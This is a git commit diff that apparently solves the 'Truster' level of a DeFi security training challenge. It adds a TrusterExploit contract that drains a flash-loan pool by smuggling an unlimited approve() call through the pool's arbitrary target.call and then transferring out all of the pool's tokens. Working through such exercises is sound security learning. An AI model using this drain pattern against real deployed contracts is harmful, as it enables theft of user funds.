8869da7fdd365168f09d99f12ebfe51bd26fcaeb
obedlaws <92595276+obedlaws@users.noreply.github.com>
2021-12-21 14:45:36 -0500

    Truster Completed

--- contracts/truster/TrusterLenderPool.sol
+++ contracts/truster/TrusterLenderPool.sol
@@ -22,7 +22,7 @@ contract TrusterLenderPool is ReentrancyGuard {
     {
         uint256 balanceBefore = damnValuableToken.balanceOf(address(this));
         require(balanceBefore >= borrowAmount, "Not enough tokens in pool");
-        
+
         damnValuableToken.transfer(borrower, borrowAmount);
         (bool success, ) = target.call(data);
         require(success, "External call failed");
@@ -31,4 +31,19 @@ contract TrusterLenderPool is ReentrancyGuard {
         require(balanceAfter >= balanceBefore, "Flash loan hasn't been paid back");
     }
 
+}
+
+contract TrusterExploit {
+    function attack ( address _pool, address _token) public {
+        TrusterLenderPool pool = TrusterLenderPool(_pool);
+        IERC20 token = IERC20(_token);
+
+        bytes memory data = abi.encodeWithSignature(
+            "approve(address,uint256)", address(this), uint(-1)
+        );
+
+        pool.flashLoan(0, msg.sender, _token, data);
+
+        token.transferFrom(_pool , msg.sender, token.balanceOf(_pool));
+    }
 }
